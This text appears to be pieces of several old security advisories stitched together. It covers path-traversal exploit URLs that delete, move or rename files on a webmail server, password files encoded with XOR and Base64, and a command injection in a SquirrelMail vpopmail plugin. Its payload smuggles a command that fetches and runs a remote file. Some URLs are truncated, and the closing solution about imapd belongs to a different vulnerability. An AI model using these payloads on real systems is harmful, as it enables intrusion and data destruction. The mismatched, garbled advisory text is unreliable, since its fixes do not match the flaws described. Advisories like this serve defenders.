It is also reported that a remote authenticated user can invoke 'viewaction.html' create arbitrary directories with the following type of URL:

http://[target]:32000/mail/viewaction.html?id=[sessionid]&folder=../../../../../../../[arbitary directory]&Move_x=1&originalfolder=blabla

It is also reported that a local user can decode user passwords in the users.cfg, settings.cfg (XOR), users.dat, and user.dat files.  Some are encoded using Base64 and others are encoded with an XOR algorithm.

It is also reported that a remote authenticated user can create a file named 'accounts.dat' with arbitrary content on the target system with the following type of URL:

http://[target]:32000/mail/accountsettings_add.html?id=[sessionid]&Save_x=1&account[EMAIL]=hacker&account[HOST]=blackhat.org&account[HOSTUS;  text]

It is also reported that a remote authenticated user can invoke 'viewaction.html' to delete arbitrary files on the target system.  A demonstration exploit URL is provided:

http://[target]:32000/mail/viewaction.html?id=[sessionid]&messageid=...//...//...//...//&#8230;//&#8230;//&#8230;//winnt/system32/cmd.exe&

It is also reported that a remote authenticated user can move arbitrary files and directories on the target system.

http://[target]:32000/mail/viewaction.html?id=[sessionid]&messageid=...//...//...//...//config/settings.cfg&Move_x=1&originalfolder=blabla&m

It is also reported that a remote authenticated user can rename arbitrary files and directories on the target system.  A demonstration exploit URL is provided:

http://[target]:32000/mail/folders.html?id=[sessionid]&folderold=blabla/...//...//...//...//config/settings.cfg&folder=blabla/...//...//...//...//cm

Solution:
No solution was available at the time of this entry.

The author of the report has provided an unofficial patch, available in the Source Message.  Kaj Beuter subsequently reported that the following line of the unofficial patch needs correction:

if (!($userid =~ /([A-Z,a-z,0-9]*)\@([\w\.]*)$/)) {

In the above line, the regexpression reportedly does not permit a dash character ("-") in the $domainname variable.  Kaj Beuter recommends using the following line instead:

if (!($userid =~ /([A-Z,a-z,0-9]*)\@([\w\.-]*)$/)) {

Description:
An input validation vulnerability was reported in the 'VPOPMail Account Administration' plugin for SquirrelMail and vpopmail.  A remote user can execute arbitrary commands on the system.
It is reported that the software does not filter user-supplied input before passing the input to a system() call.  In 'vpopmail.php', the user-supplied password (stored in the '$pwd' variable) is provided unfiltered to the command shell:

system("$vpasswd $username $pwd");

A remote user can supply a specially crafted value for the password that contains commands and will be executed by the target server.  A demonstration exploit is provided:

passwd; wget example.com/exploit -O /tmp/f;chmod +x /tmp/f;/tmp/f;

According to the report, the plugin requires that the web server run with 'vpopmail' user privileges.  So, the commands will run with 'vpopmail' user privileges.

Solution:
The vendor has clarified the conditions under which certain versions are vulnerable.

The vendor notes that legacy RFC 1730 support (which contains the vulnerability), is disabled by default in imap-2001 (imapd version 2001.313) and imap-2001a (imapd version 2001.315).  As a result, an unmodified imapd based upon imap-2001 or imap-2001a is reportedly not vulnerable.

The vendor has also issued a patch (see the Source Message for a properly formatted version of the patch).

